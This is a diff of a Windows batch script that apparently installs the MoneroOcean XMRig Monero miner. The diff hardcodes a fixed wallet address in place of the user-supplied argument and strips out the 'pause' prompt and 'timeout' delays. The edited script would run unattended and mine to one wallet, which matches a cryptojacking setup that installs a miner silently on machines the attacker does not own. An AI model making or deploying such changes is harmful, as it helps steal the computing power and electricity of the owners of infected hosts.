@@ -12,7 +12,7 @@ net session >nul 2>&1
 if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
 
 rem command line arguments
-set WALLET=%1
+set WALLET=44apnYfberJCrxVhnKmzWqNqKqKf98HQgBzHnBDKQDN7GXjfzs1QKCKHFuNHtsyZCwQjXGcZszMr9hBepSgVMnvy3B1gXGq
 rem this one is optional
 set EMAIL=%2
 
@@ -126,7 +126,6 @@ echo.
 echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% KH/s.
 echo.
 
-pause
 
 rem start doing stuff: preparing miner
 
@@ -137,7 +136,6 @@ taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
 echo [*] Removing "%USERPROFILE%\moneroocean" directory
-timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
@@ -188,7 +186,7 @@ if errorlevel 1 (
 
 :REMOVE_DIR1
 echo [*] Removing "%USERPROFILE%\moneroocean" directory
-timeout 5
+
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR1
 
